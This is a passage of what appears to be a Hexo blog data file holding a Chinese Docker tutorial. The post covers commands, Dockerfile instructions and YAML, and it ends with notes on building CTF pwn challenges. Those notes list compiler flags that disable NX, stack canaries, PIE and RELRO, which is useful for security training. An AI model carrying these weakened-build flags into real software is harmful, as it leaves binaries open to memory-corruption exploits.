to</code>应用该修改。</p>\n<p>修改后的程序可以绕过判断向服务器发送信息，最后可以得到flag。</p>"},{"title":"Docker的使用","date":"2023-01-01T16:02:00.000Z","_content":"Docker是一种容器，与虚拟机有所不同。虚拟机在宿主机上建立一层虚拟层，在虚拟层上运行新的os，而容器没有建立虚拟层，直接调用原生os的资源。因此虚拟机的隔离性更好，当然消耗资源也会更高，而容器的隔离性没有这么好，属于原生os的一个进程。\n\n<!--more-->\n\n## Docker的基本概念\n\nDocker中有三个基本的概念，分别是**镜像(Image)、容器(Container)和仓库(repository)**。镜像是容器运行的前提，仓库是存放容器的场所，镜像是Docker的核心。\n\n镜像可以看作是一个**特殊的文件系统**，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。\n\n容器 (container) 的定义和镜像 (image) 几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。实际上，**容器 = 镜像 + 读写层**。\n\n仓库是集中存放镜像文件的场所。镜像构建完成后，可以很容易的在当前宿主上运行，但是， 如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry (仓库注册服务器)就是这样的服务。有时候会把仓库(Repository) 和仓库注册服务器 (Registry) 混为一谈，并不严格区分。Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。实际上，一个 Docker Registry 中可以包含多个仓库 (Repository) ，每个仓库可以包含多个标签 (Tag)，每个标签对应着一个镜像。所以说，**镜像仓库是 Docker 用来集中存放镜像文件的地方**类似于我们之前常用的代码仓库。\n\n通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本 。我们可以通过 **<仓库名>:<标签>的格式**来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。\n\n## Docker常用命令\n\n```sh\ndocker -help //获取帮助手册\ndocker pull image_name //拉取名字为image_name的镜像\ndocker images //查看本地的镜像\ndocker ps -a //查看哪些容器运行过\ndocker ps //查看哪些容器正在运行\ndocker start container_name/container_id //启动容器\ndocker restart container_name/container_id //重启容器\ndocker stop container_name/container_id //关闭容器\ndocker attach container_name/container_id //进入容器\n\n//运行容器\ndocker run --name image_name -d -p port repo_name/image_name:tag //-p指定该容器的端口号 -d表示后台运行\ndocker run -t -i container_name/container_id /bin/bash // -t 终端、-i 交互式操作\n\ndocker search image_name //查找镜像\ndocker rm container_name/container_id //删除容器\ndocker rmi image_name //删除镜像\n```\n\n## Dockerfile\n\nDockerfile是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明，用户可以使用 Dockerfile 快速创建自定义的镜像。\n\n一般来说，我们可以将 Dockerfile 分为四个部分：\n\n1. 基础镜像(父镜像)信息指令 FROM\n2. 维护者信息指令 MAINTAINER\n3. 镜像操作指令 RUN 、 EVN 、 ADD 和 WORKDIR 等\n4. 容器启动指令 CMD 、 ENTRYPOINT 和 USER 等\n\n我们可以通过build命令使用Dockerfile创建镜像：\n\n```shell\ndocker build -t repo_name/image_name:tag dockerfile_relative_path //-t 是为新镜像设置仓库和名称 dockerfile_relative_path表示Dockerfile的相对路径\n```\n\n\n### Dockerfile常用指令\n\n由于 Dockerfile 中所有的命令都是以下格式：INSTRUCTION argument ，指令 (INSTRUCTION) 不分大小写，但是**推荐大写**。\n\n#### FROM\n\n定制的镜像往往是基于一个原有的镜像进行的，Docker中的From命令就是用于**指定基础镜像**。一般格式为：\n\n```docker\nFROM image_name/image_name:tag\n```\n\nFROM 以后的所有指令都会在 FROM 的基础上进行创建镜像。可以在同一个 Dockerfile 中多次使用 FROM 命令用于创建多个镜像。\n\n#### MAINTAINER（将被删除）\n\nMAINTAINER 是用于指定镜像创建者和联系方式。一般格式为：\n\n```docker\nMAINTAINER name <email>\n```\n\n#### COPY\n\nCOPY 是用于**复制本地主机的资源**\\<src>(为 Dockerfile 所在目录的相对路径)到容器中的\\<dest>。一般格式为：\n\n```docker\nCOPY src dest\n```\n\n#### ADD\n\nADD命令的功能与COPY类似，都是在容器中新增一个资源，但不同的是ADD可以从网络中获取资源，并且如果源文件为.tar的话，ADD命令可以自动解压缩到目标路径。\n\n但是在不解压的前提下，无法复制 tar 压缩文件。这会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。\n\n一般格式：\n\n```docker\nADD src dest\n```\n\n#### WORKDIR\n\nWORKDIR 用于配合 RUN，CMD，ENTRYPOINT 命令**设置当前工作路径**。可以设置多次，如果是相对路径，则**相对前一个 WORKDIR 命令**，默认路径为/。\n\n一般格式为:\n\n```docker\nWORKDIR relative_path\n```\n\n#### RUN\n\nRUN 用于容器内部执行命令。每个RUN命令相当于在原有的镜像基础上添加了一个改动层，原有的镜像不会有变化。一般格式为:\n\n```docker\nRUN command\n```\n\n#### EXPOSE\n\nEXPOSE 命令用来指定对外开放的端口（实际情况下不一定会打开）。一般格式为:\n\n```docker\nEXPOSE port/[port,...]\n```\n\n#### ENTRYPOINT\n\nENTRYPOINT 可以让你的容器表现得像一个可执行程序一样。一个 Dockerfile 中只能有一个 ENTRYPOINT，如果有多个，则最后一个生效。\n\nENTRYPOINT命令有两种格式：\n\n```docker\nENTRYPOINT [\"executable\", \"param1\", \"param2\"] //推荐使用的 exec形式(直接调用对应命令)\nENTRYPOINT command param1 param2 //shell 形式(通过shell执行命令，如果没有shell则不行)\n```\n\n#### CMD\n\nCMD 命令用于**启动容器时默认执行的命令**，CMD 命令可以包含可执行文件，也可以不包含可执行文件。不包含可执行文件的情况下就要用 ENTRYPOINT 指定一个，然后**CMD命令的参数就会作为ENTRYPOINT的参数**。\n\nCMD命令有三种格式：\n\n```docker\nCMD [\"executable\",\"param1\",\"param2\"] //推荐使用的 exec 形式(直接调用对应命令)\nCMD [\"param1\",\"param2\"] //无可执行程序形式\nCMD command param1 param2 //shell 形式(通过shell执行命令，如果没有shell则不行)\n```\n\n#### VOLUME \n\nVOLUME命令用于挂载一个目录，即**建立一个容器和宿主机的目录的映射**，其中的内容是共享的，一处改变另一处也会改变。可以在docker build中使用-v指令指定宿主机映射的目录，如果没有则默认映射到/docker/value/.../data。\n\n一般格式为：\n\n```docker\nVOLUME directory_name\n```\n\n#### USER\n\nUSER命令用于指定执行后续命令的用户或用户主，一般格式为：\n\n```docker\nUSER user_name[:user_group]\n```\n\n#### ARG\n\nARG命令用于设置一个dockerfile中的变量，一般格式为:\n\n```docker\nARG key = value\n```\n\n#### ENV\n\nENV命令用于设置环境变量，一般格式为：\n\n```docker\nENV key = value\n```\n\n### Docker特权设置\n\ndocker容器本质上仍是一个使用当前系统资源运行的进程。因此，即使在容器中有了root权限，有些操作仍然不能进行（因为会对系统的资源进行更改）。如果想要容器拥有这些权限，我们需要手动设置。\n\ndocker使用--privileged, --cap-add, --cap-drop 来对容器本身的能力进行开放或限制，使用 --cap-add, --cap-drop 可以**添加**或**禁用**特定的权限，--privileged可以开放所有的权限。\n\n```docker\ndocker run -it --cap-add SYS_TIME --rm --name centos /bin/sh //开放了SYS_TIME的权限\n//--rm代表运行完自动删除\n```\n\n### 缓存清理\n\n当镜像太多的时候，会占用不少的空间，此时可以清理缓存让自己多点空间可用。在使用build新建容器的时候，为了减少之后build所需的时间，部分内容会存入cache当中，如果空间太大了可以手动清空一下缓存：\n\n```docker\ndocker builder prune\n```\n\n清除所有镜像（慎用）\n\n```docker\ndocker image prune\n```\n\n清除所有网络、容器、镜像和缓存（慎用）\n\n```docker\ndocker system prune\n```\n\n## Docker Compose\n\nCompose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来**配置应用程序需要的所有服务**。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。\n\n### YAML\n\nYAML 的语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（例如：许多电子邮件标题格式和YAML非常接近）。YAML 的配置文件后缀为 .yml\n\n基本语法:\n\n- 大小写敏感\n- 使用缩进表示层级关系\n- 缩进不允许使用tab，只允许空格\n- 缩进的空格数不重要，只要相同层级的元素左对齐即可\n- '#'表示注释\n\n#### YAML对象\n\n对象键值对使用冒号结构表示 key: value，**冒号后面要加一个空格**。\n\n对象之间可以嵌套，使用缩进表示层级关系。\n\n```YAML\nkey: \n    child_key1: value1\n    child_key2: value2\n```\n\n如果有复杂的对象，可以使用?加空格表示复杂的key，使用:加空格表示value。\n\n```YAML\n? \n    - key1\n    - key2\n: \n    - value1\n    - value2\n```\n\n#### YAML数组\n\n用- 开头的行表示一个数组\n\n```YAML\n- A\n- B\n- C\n```\n\n表示数组[A,B,C]\n\n可以支持多维数组：\n\n```YAML\n- \n - A\n - B\n - C\n```\n\n表示[[A,B,C]]\n\n数组也可以使用流式(flow)的方式表示：\n\n```YAML\ncompanies: [{id: 1,name: company1,price: 200W},{id: 2,name: company2,price: 500W}]\n```\n\n数组和对象可以构成复合结构。\n\n#### 纯量\n\n最基本的不可再分的值，包括：字符串（可以拆成多行，每一行会被转化成一个空格）、布尔值、整数、浮点数、Null、时间（使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区）、日期（必须使用ISO 8601格式，即yyyy-MM-dd）。\n\n\n#### 锚点和引用\n\n用&表示建立锚点，用*表示引用锚点。\n\n```YAML\ndefaults: &defaults\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  <<: *defaults\n```\n\n相当于:\n\n```YAML\ndefaults:\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  adapter:  postgres\n  host:     localhost\n```\n\n<<表示合并到当前数据。\n\n### 本次出题\n\n```docker\ndocker build -t \"problem_name\" .\ndocker run -d -p \"0.0.0.0:pub_port:9999\" -h \"hostname\" --name=\"container_name\" problem_name\n```\n\n编译\n\n```sh\n# NX保护机制：\n-z execstack / -z noexecstack  # (关闭 / 开启) 堆栈不可执行\n\n# Canary：(关闭 / 开启 / 全开启) 栈里插入cookie信息\n# !开canary好像会造成栈中局部变量的顺序有所改变\n-fno-stack-protector /-fstack-protector / -fstack-protector-all \n\n# ASLR和PIE：\n-no-pie / -pie   # (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk\n\n# RELRO：\n-z norelro / -z lazy / -z now   # (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限\n\n-s   # 去除符号表\n\n```\n\n","source":"_posts/Docker.md","raw":"---\ntitle: Docker的使用\ndate: 2023-01-02 00:02:00\ncategories: \n- pwn\ntags: \n- docker\n- pwn\n---\nDocker是一种容器，与虚拟机有所不同。虚拟机在宿主机上建立一层虚拟层，在虚拟层上运行新的os，而容器没有建立虚拟层，直接调用原生os的资源。因此虚拟机的隔离性更好，当然消耗资源也会更高，而容器的隔离性没有这么好，属于原生os的一个进程。\n\n<!--more-->\n\n## Docker的基本概念\n\nDocker中有三个基本的概念，分别是**镜像(Image)、容器(Container)和仓库(repository)**。镜像是容器运行的前提，仓库是存放容器的场所，镜像是Docker的核心。\n\n镜像可以看作是一个**特殊的文件系统**，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。\n\n容器 (container) 的定义和镜像 (image) 几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。实际上，**容器 = 镜像 + 读写层**。\n\n仓库是集中存放镜像文件的场所。镜像构建完成后，可以很容易的在当前宿主上运行，但是， 如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry (仓库注册服务器)就是这样的服务。有时候会把仓库(Repository) 和仓库注册服务器 (Registry) 混为一谈，并不严格区分。Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。实际上，一个 Docker Registry 中可以包含多个仓库 (Repository) ，每个仓库可以包含多个标签 (Tag)，每个标签对应着一个镜像。所以说，**镜像仓库是 Docker 用来集中存放镜像文件的地方**类似于我们之前常用的代码仓库。\n\n通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本 。我们可以通过 **<仓库名>:<标签>的格式**来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。\n\n## Docker常用命令\n\n```sh\ndocker -help //获取帮助手册\ndocker pull image_name //拉取名字为image_name的镜像\ndocker images //查看本地的镜像\ndocker ps -a //查看哪些容器运行过\ndocker ps //查看哪些容器正在运行\ndocker start container_name/container_id //启动容器\ndocker restart container_name/container_id //重启容器\ndocker stop container_name/container_id //关闭容器\ndocker attach container_name/container_id //进入容器\n\n//运行容器\ndocker run --name image_name -d -p port repo_name/image_name:tag //-p指定该容器的端口号 -d表示后台运行\ndocker run -t -i container_name/container_id /bin/bash // -t 终端、-i 交互式操作\n\ndocker search image_name //查找镜像\ndocker rm container_name/container_id //删除容器\ndocker rmi image_name //删除镜像\n```\n\n## Dockerfile\n\nDockerfile是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明，用户可以使用 Dockerfile 快速创建自定义的镜像。\n\n一般来说，我们可以将 Dockerfile 分为四个部分：\n\n1. 基础镜像(父镜像)信息指令 FROM\n2. 维护者信息指令 MAINTAINER\n3. 镜像操作指令 RUN 、 EVN 、 ADD 和 WORKDIR 等\n4. 容器启动指令 CMD 、 ENTRYPOINT 和 USER 等\n\n我们可以通过build命令使用Dockerfile创建镜像：\n\n```shell\ndocker build -t repo_name/image_name:tag dockerfile_relative_path //-t 是为新镜像设置仓库和名称 dockerfile_relative_path表示Dockerfile的相对路径\n```\n\n\n### Dockerfile常用指令\n\n由于 Dockerfile 中所有的命令都是以下格式：INSTRUCTION argument ，指令 (INSTRUCTION) 不分大小写，但是**推荐大写**。\n\n#### FROM\n\n定制的镜像往往是基于一个原有的镜像进行的，Docker中的From命令就是用于**指定基础镜像**。一般格式为：\n\n```docker\nFROM image_name/image_name:tag\n```\n\nFROM 以后的所有指令都会在 FROM 的基础上进行创建镜像。可以在同一个 Dockerfile 中多次使用 FROM 命令用于创建多个镜像。\n\n#### MAINTAINER（将被删除）\n\nMAINTAINER 是用于指定镜像创建者和联系方式。一般格式为：\n\n```docker\nMAINTAINER name <email>\n```\n\n#### COPY\n\nCOPY 是用于**复制本地主机的资源**\\<src>(为 Dockerfile 所在目录的相对路径)到容器中的\\<dest>。一般格式为：\n\n```docker\nCOPY src dest\n```\n\n#### ADD\n\nADD命令的功能与COPY类似，都是在容器中新增一个资源，但不同的是ADD可以从网络中获取资源，并且如果源文件为.tar的话，ADD命令可以自动解压缩到目标路径。\n\n但是在不解压的前提下，无法复制 tar 压缩文件。这会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。\n\n一般格式：\n\n```docker\nADD src dest\n```\n\n#### WORKDIR\n\nWORKDIR 用于配合 RUN，CMD，ENTRYPOINT 命令**设置当前工作路径**。可以设置多次，如果是相对路径，则**相对前一个 WORKDIR 命令**，默认路径为/。\n\n一般格式为:\n\n```docker\nWORKDIR relative_path\n```\n\n#### RUN\n\nRUN 用于容器内部执行命令。每个RUN命令相当于在原有的镜像基础上添加了一个改动层，原有的镜像不会有变化。一般格式为:\n\n```docker\nRUN command\n```\n\n#### EXPOSE\n\nEXPOSE 命令用来指定对外开放的端口（实际情况下不一定会打开）。一般格式为:\n\n```docker\nEXPOSE port/[port,...]\n```\n\n#### ENTRYPOINT\n\nENTRYPOINT 可以让你的容器表现得像一个可执行程序一样。一个 Dockerfile 中只能有一个 ENTRYPOINT，如果有多个，则最后一个生效。\n\nENTRYPOINT命令有两种格式：\n\n```docker\nENTRYPOINT [\"executable\", \"param1\", \"param2\"] //推荐使用的 exec形式(直接调用对应命令)\nENTRYPOINT command param1 param2 //shell 形式(通过shell执行命令，如果没有shell则不行)\n```\n\n#### CMD\n\nCMD 命令用于**启动容器时默认执行的命令**，CMD 命令可以包含可执行文件，也可以不包含可执行文件。不包含可执行文件的情况下就要用 ENTRYPOINT 指定一个，然后**CMD命令的参数就会作为ENTRYPOINT的参数**。\n\nCMD命令有三种格式：\n\n```docker\nCMD [\"executable\",\"param1\",\"param2\"] //推荐使用的 exec 形式(直接调用对应命令)\nCMD [\"param1\",\"param2\"] //无可执行程序形式\nCMD command param1 param2 //shell 形式(通过shell执行命令，如果没有shell则不行)\n```\n\n#### VOLUME \n\nVOLUME命令用于挂载一个目录，即**建立一个容器和宿主机的目录的映射**，其中的内容是共享的，一处改变另一处也会改变。可以在docker build中使用-v指令指定宿主机映射的目录，如果没有则默认映射到/docker/value/.../data。\n\n一般格式为：\n\n```docker\nVOLUME directory_name\n```\n\n#### USER\n\nUSER命令用于指定执行后续命令的用户或用户主，一般格式为：\n\n```docker\nUSER user_name[:user_group]\n```\n\n#### ARG\n\nARG命令用于设置一个dockerfile中的变量，一般格式为:\n\n```docker\nARG key = value\n```\n\n#### ENV\n\nENV命令用于设置环境变量，一般格式为：\n\n```docker\nENV key = value\n```\n\n### Docker特权设置\n\ndocker容器本质上仍是一个使用当前系统资源运行的进程。因此，即使在容器中有了root权限，有些操作仍然不能进行（因为会对系统的资源进行更改）。如果想要容器拥有这些权限，我们需要手动设置。\n\ndocker使用--privileged, --cap-add, --cap-drop 来对容器本身的能力进行开放或限制，使用 --cap-add, --cap-drop 可以**添加**或**禁用**特定的权限，--privileged可以开放所有的权限。\n\n```docker\ndocker run -it --cap-add SYS_TIME --rm --name centos /bin/sh //开放了SYS_TIME的权限\n//--rm代表运行完自动删除\n```\n\n### 缓存清理\n\n当镜像太多的时候，会占用不少的空间，此时可以清理缓存让自己多点空间可用。在使用build新建容器的时候，为了减少之后build所需的时间，部分内容会存入cache当中，如果空间太大了可以手动清空一下缓存：\n\n```docker\ndocker builder prune\n```\n\n清除所有镜像（慎用）\n\n```docker\ndocker image prune\n```\n\n清除所有网络、容器、镜像和缓存（慎用）\n\n```docker\ndocker system prune\n```\n\n## Docker Compose\n\nCompose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来**配置应用程序需要的所有服务**。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。\n\n### YAML\n\nYAML 的语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（例如：许多电子邮件标题格式和YAML非常接近）。YAML 的配置文件后缀为 .yml\n\n基本语法:\n\n- 大小写敏感\n- 使用缩进表示层级关系\n- 缩进不允许使用tab，只允许空格\n- 缩进的空格数不重要，只要相同层级的元素左对齐即可\n- '#'表示注释\n\n#### YAML对象\n\n对象键值对使用冒号结构表示 key: value，**冒号后面要加一个空格**。\n\n对象之间可以嵌套，使用缩进表示层级关系。\n\n```YAML\nkey: \n    child_key1: value1\n    child_key2: value2\n```\n\n如果有复杂的对象，可以使用?加空格表示复杂的key，使用:加空格表示value。\n\n```YAML\n? \n    - key1\n    - key2\n: \n    - value1\n    - value2\n```\n\n#### YAML数组\n\n用- 开头的行表示一个数组\n\n```YAML\n- A\n- B\n- C\n```\n\n表示数组[A,B,C]\n\n可以支持多维数组：\n\n```YAML\n- \n - A\n - B\n - C\n```\n\n表示[[A,B,C]]\n\n数组也可以使用流式(flow)的方式表示：\n\n```YAML\ncompanies: [{id: 1,name: company1,price: 200W},{id: 2,name: company2,price: 500W}]\n```\n\n数组和对象可以构成复合结构。\n\n#### 纯量\n\n最基本的不可再分的值，包括：字符串（可以拆成多行，每一行会被转化成一个空格）、布尔值、整数、浮点数、Null、时间（使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区）、日期（必须使用ISO 8601格式，即yyyy-MM-dd）。\n\n\n#### 锚点和引用\n\n用&表示建立锚点，用*表示引用锚点。\n\n```YAML\ndefaults: &defaults\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  <<: *defaults\n```\n\n相当于:\n\n```YAML\ndefaults:\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  adapter:  postgres\n  host:     localhost\n```\n\n<<表示合并到当前数据。\n\n### 本次出题\n\n```docker\ndocker build -t \"problem_name\" .\ndocker run -d -p \"0.0.0.0:pub_port:9999\" -h \"hostname\" --name=\"container_name\" problem_name\n```\n\n编译\n\n```sh\n# NX保护机制：\n-z execstack / -z noexecstack  # (关闭 / 开启) 堆栈不可执行\n\n# Canary：(关闭 / 开启 / 全开启) 栈里插入cookie信息\n# !开canary好像会造成栈中局部变量的顺序有所改变\n-fno-stack-protector /-fstack-protector / -fstack-protector-all \n\n# ASLR和PIE：\n-no-pie / -pie   # (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk\n\n# RELRO：\n-z norelro / -z lazy / -z now   # (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限\n\n-s   # 去除符号表\n\n```\n\n","slug":"Docker","published":1,"updated":"2023-01-03T15:03:40.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaf0000c5oudh01zcupf","content":"<p>Docker是一种容器，与虚拟机有所不同。虚拟机在宿主机上建立一层虚拟层，在虚拟层上运行新的os，而容器没有建立虚拟层，直接调用原生os的资源。因此虚拟机的隔离性更好，当然消耗资源也会更高，而容器的隔离性没有这么好，属于原生os的一个进程。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Docker的基本概念\"><a href=\"#Docker的基本概念\" class=\"headerlink\" title=\"Docker的基本概念\"></a>Docker的基本概念</h2><p>Docker中有三个基本的概念，分别是**镜像(Image)、容器(Container)和仓库(repository)**。镜像是容器运行的前提，仓库是存放容器的场所，镜像是Docker的核心。</p>\n<p>镜像可以看作是一个<strong>特殊的文件系统</strong>，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p>\n<p>容器 (container) 的定义和镜像 (image) 几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。实际上，<strong>容器 = 镜像 + 读写层</strong>。</p>\n<p>仓库是集中存放镜像文件的场所。镜像构建完成后，可以很容易的在当前宿主上运行，但是， 如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry (仓库注册服务器)就是这样的服务。有时候会把仓库(Repository) 和仓库注册服务器 (Registry) 混为一谈，并不严格区分。Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。实际上，一个 Docker Registry 中可以包含多个仓库 (Repository) ，每个仓库可以包含多个标签 (Tag)，每个标签对应着一个镜像。所以说，<strong>镜像仓库是 Docker 用来集中存放镜像文件的地方</strong>类似于我们之前常用的代码仓库。</p>\n<p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本 。我们可以通过 <strong>&lt;仓库名&gt;:&lt;标签&gt;的格式</strong>来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。</p>\n<h2 id=\"Docker常用命令\"><a href=\"#Docker常用命令\" class=\"headerlink\" title=\"Docker常用命令\"></a>Docker常用命令</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker -<span class=\"built_in\">help</span> //获取帮助手册</span><br><span class=\"line\">docker pull image_name //拉取名字为image_name的镜像</span><br><span class=\"line\">docker images //查看本地的镜像</span><br><span class=\"line\">docker ps -a //查看哪些容器运行过</span><br><span class=\"line\">docker ps //查看哪些容器正在运行</span><br><span class=\"line\">docker start container_name/container_id //启动容器</span><br><span class=\"line\">docker restart container_name/container_id //重启容器</span><br><span class=\"line\">docker stop container_name/container_id //关闭容器</span><br><span class=\"line\">docker attach container_name/container_id //进入容器</span><br><span class=\"line\"></span><br><span class=\"line\">//运行容器</span><br><span class=\"line\">docker run --name image_name -d -p port repo_name/image_name:tag //-p指定该容器的端口号 -d表示后台运行</span><br><span class=\"line\">docker run -t -i container_name/container_id /bin/bash // -t 终端、-i 交互式操作</span><br><span class=\"line\"></span><br><span class=\"line\">docker search image_name //查找镜像</span><br><span class=\"line\">docker <span class=\"built_in\">rm</span> container_name/container_id //删除容器</span><br><span class=\"line\">docker rmi image_name //删除镜像</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Dockerfile\"><a href=\"#Dockerfile\" class=\"headerlink\" title=\"Dockerfile\"></a>Dockerfile</h2><p>Dockerfile是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明，用户可以使用 Dockerfile 快速创建自定义的镜像。</p>\n<p>一般来说，我们可以将 Dockerfile 分为四个部分：</p>\n<ol>\n<li>基础镜像(父镜像)信息指令 FROM</li>\n<li>维护者信息指令 MAINTAINER</li>\n<li>镜像操作指令 RUN 、 EVN 、 ADD 和 WORKDIR 等</li>\n<li>容器启动指令 CMD 、 ENTRYPOINT 和 USER 等</li>\n</ol>\n<p>我们可以通过build命令使用Dockerfile创建镜像：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build -t repo_name/image_name:tag dockerfile_relative_path //-t 是为新镜像设置仓库和名称 dockerfile_relative_path表示Dockerfile的相对路径</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Dockerfile常用指令\"><a href=\"#Dockerfile常用指令\" class=\"headerlink\" title=\"Dockerfile常用指令\"></a>Dockerfile常用指令</h3><p>由于 Dockerfile 中所有的命令都是以下格式：INSTRUCTION argument ，指令 (INSTRUCTION) 不分大小写，但是<strong>推荐大写</strong>。</p>\n<h4 id=\"FROM\"><a href=\"#FROM\" class=\"headerlink\" title=\"FROM\"></a>FROM</h4><p>定制的镜像往往是基于一个原有的镜像进行的，Docker中的From命令就是用于<strong>指定基础镜像</strong>。一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> image_name/image_name:tag</span><br></pre></td></tr></table></figure>\n\n<p>FROM 以后的所有指令都会在 FROM 的基础上进行创建镜像。可以在同一个 Dockerfile 中多次使用 FROM 命令用于创建多个镜像。</p>\n<h4 id=\"MAINTAINER（将被删除）\"><a href=\"#MAINTAINER（将被删除）\" class=\"headerlink\" title=\"MAINTAINER（将被删除）\"></a>MAINTAINER（将被删除）</h4><p>MAINTAINER 是用于指定镜像创建者和联系方式。一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">MAINTAINER</span> name &lt;email&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"COPY\"><a href=\"#COPY\" class=\"headerlink\" title=\"COPY\"></a>COPY</h4><p>COPY 是用于<strong>复制本地主机的资源</strong>&lt;src&gt;(为 Dockerfile 所在目录的相对路径)到容器中的&lt;dest&gt;。一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> src dest</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ADD\"><a href=\"#ADD\" class=\"headerlink\" title=\"ADD\"></a>ADD</h4><p>ADD命令的功能与COPY类似，都是在容器中新增一个资源，但不同的是ADD可以从网络中获取资源，并且如果源文件为.tar的话，ADD命令可以自动解压缩到目标路径。</p>\n<p>但是在不解压的前提下，无法复制 tar 压缩文件。这会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。</p>\n<p>一般格式：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ADD</span><span class=\"language-bash\"> src dest</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"WORKDIR\"><a href=\"#WORKDIR\" class=\"headerlink\" title=\"WORKDIR\"></a>WORKDIR</h4><p>WORKDIR 用于配合 RUN，CMD，ENTRYPOINT 命令<strong>设置当前工作路径</strong>。可以设置多次，如果是相对路径，则<strong>相对前一个 WORKDIR 命令</strong>，默认路径为/。</p>\n<p>一般格式为:</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> relative_path</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"RUN\"><a href=\"#RUN\" class=\"headerlink\" title=\"RUN\"></a>RUN</h4><p>RUN 用于容器内部执行命令。每个RUN命令相当于在原有的镜像基础上添加了一个改动层，原有的镜像不会有变化。一般格式为:</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span 